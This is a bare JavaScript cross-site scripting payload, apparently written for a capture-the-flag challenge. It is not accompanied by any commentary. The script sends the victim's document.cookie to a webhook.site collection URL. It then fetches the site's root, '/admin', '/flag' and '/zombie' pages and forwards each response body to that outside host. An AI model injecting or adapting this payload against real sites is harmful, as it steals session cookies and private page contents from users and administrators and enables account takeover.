var w='https://webhook.site/a772717c-3906-4833-9f3d-e5c9cef5b78a';
fetch(w+'/cookie?d='+encodeURIComponent(document.cookie));
fetch('/').then(r=>r.text()).then(t=>fetch(w+'/page?d='+encodeURIComponent(t)));
fetch('/admin').then(r=>r.text()).then(t=>fetch(w+'/admin?d='+encodeURIComponent(t)));
fetch('/flag').then(r=>r.text()).then(t=>fetch(w+'/flag?d='+encodeURIComponent(t)));
fetch('/zombie').then(r=>r.text()).then(t=>fetch(w+'/zombie?d='+encodeURIComponent(t)))
